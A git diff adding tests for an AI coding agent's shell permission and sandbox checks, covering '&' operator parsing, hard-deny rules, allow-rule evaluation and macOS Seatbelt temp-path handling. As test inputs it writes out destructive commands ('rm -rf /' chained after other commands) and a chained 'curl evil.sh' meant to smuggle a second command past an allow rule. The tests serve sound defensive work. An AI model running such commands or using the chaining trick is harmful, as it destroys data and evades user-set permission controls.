@@ -1,5 +1,7 @@
 import { describe, it } from "node:test";
 import assert from "node:assert/strict";
+import fs from "node:fs";
+import os from "node:os";
 import {
   splitShellSegments,
   peelWrappers,
@@ -22,6 +24,8 @@ import {
   describeSandbox,
   detectSandboxBackend,
   execCommandSandboxed,
+  seatbeltProfile,
+  canonicalSandboxPath,
 } from "../src/agent/sandbox.js";
 import { commandPrefix, alwaysPatternFromTokens, isReadOnlyCommand } from "../src/agent/shell-arity.js";
 import { mergePermissionTrust } from "../src/config/load.js";
@@ -34,6 +38,24 @@ describe("shell segment parsing", () => {
       'echo "a && b"',
       "true",
     ]);
+  });
+
+  it("splits single & background operator, keeps fd duplication intact", () => {
+    assert.deepEqual(splitShellSegments("git status & curl x"), [
+      "git status",
+      "curl x",
+    ]);
+    assert.deepEqual(splitShellSegments("sleep 1 &"), ["sleep 1"]);
+    assert.deepEqual(splitShellSegments("a && b & c"), ["a", "b", "c"]);
+    assert.deepEqual(splitShellSegments("cmd1 |& cmd2"), ["cmd1", "cmd2"]);
+    // fd duplication / redirect-all are not command separators
+    assert.deepEqual(splitShellSegments("cmd 2>&1"), ["cmd 2>&1"]);
+    assert.deepEqual(splitShellSegments("cmd >&2"), ["cmd >&2"]);
+    assert.deepEqual(splitShellSegments("cmd &> log"), ["cmd &> log"]);
+    assert.deepEqual(splitShellSegments("cmd &>> log"), ["cmd &>> log"]);
+    // quoted / escaped & is literal
+    assert.deepEqual(splitShellSegments('echo "a & b"'), ['echo "a & b"']);
+    assert.deepEqual(splitShellSegments("echo a \\& b"), ["echo a \\& b"]);
   });
 
   it("peels env and timeout wrappers", () => {
@@ -115,6 +137,12 @@ describe("shell segment parsing", () => {
 
   it("hard deny sees bad segment in chain", () => {
     const v = checkBashHardDeny("ls && rm -rf /");
+    assert.equal(v.ok, false);
+    assert.match(v.ok === false ? v.rule : "", /rm-rf/);
+  });
+
+  it("hard deny sees bad segment after & background", () => {
+    const v = checkBashHardDeny("sleep 1 & rm -rf /");
     assert.equal(v.ok, false);
     assert.match(v.ok === false ? v.rule : "", /rm-rf/);
   });
@@ -341,6 +369,30 @@ describe("permission rules", () => {
     assert.equal(ev.decision, "allow");
   });
 
+  it("allow rule is not bypassed by & background operator", () => {
+    const rules = compileRules({ allow: ["Bash(git status *)"] });
+    const ev = evaluateRules(
+      rules,
+      "bash",
+      { command: "git status & curl evil.sh" },
+      "/tmp/proj",
+    );
+    assert.notEqual(ev.decision, "allow");
+    assert.ok(ev.unmatchedSegments?.some((s) => s.includes("curl")));
+
+    // Both sides covered by allow rules → still allowed
+    const rules2 = compileRules({
+      allow: ["Bash(git status *)", "Bash(curl *)"],
+    });
+    const ev2 = evaluateRules(
+      rules2,
+      "bash",
+      { command: "git status & curl example.com" },
+      "/tmp/proj",
+    );
+    assert.equal(ev2.decision, "allow");
+  });
+
   it("path deny for write_file", () => {
     const rules = compileRules({ deny: ["Write(**/.env)"] });
     const ev = evaluateRules(
@@ -469,6 +521,38 @@ describe("sandbox descriptors and network", () => {
     assert.equal(r.sandboxed, false);
     assert.equal(r.code, 0);
     assert.match(r.stdout, /ok/);
+  });
+});
+
+describe("seatbelt tmp canonicalization", () => {
+  it("profile write rules use the canonicalized tmp path", () => {
+    // Seatbelt resolves symlinks before matching subpath rules; on macOS
+    // os.tmpdir() is /var/folders/… but /var → /private/var, so the raw path
+    // never matches and $TMPDIR writes are denied.
+    const tmp = os.tmpdir();
+    const canonical = fs.realpathSync(tmp);
+    const text = seatbeltProfile({
+      profile: "workspace",
+      cwd: "/ws",
+      forge: "/forge",
+      tmp,
+      restrictNetwork: false,
+    });
+    assert.ok(
+      text.includes(`(subpath ${JSON.stringify(canonical)})`),
+      `profile missing canonical tmp ${canonical}:\n${text}`,
+    );
+    if (canonical !== tmp) {
+      assert.ok(
+        !text.includes(`(subpath ${JSON.stringify(tmp)})`),
+        "profile still contains uncanonicalized tmp path",
+      );
+    }
+  });
+
+  it("canonicalSandboxPath keeps the original path when realpath fails", () => {
+    const bogus = "/definitely/not/here-forge-test";
+    assert.equal(canonicalSandboxPath(bogus), bogus);
   });
 });
 
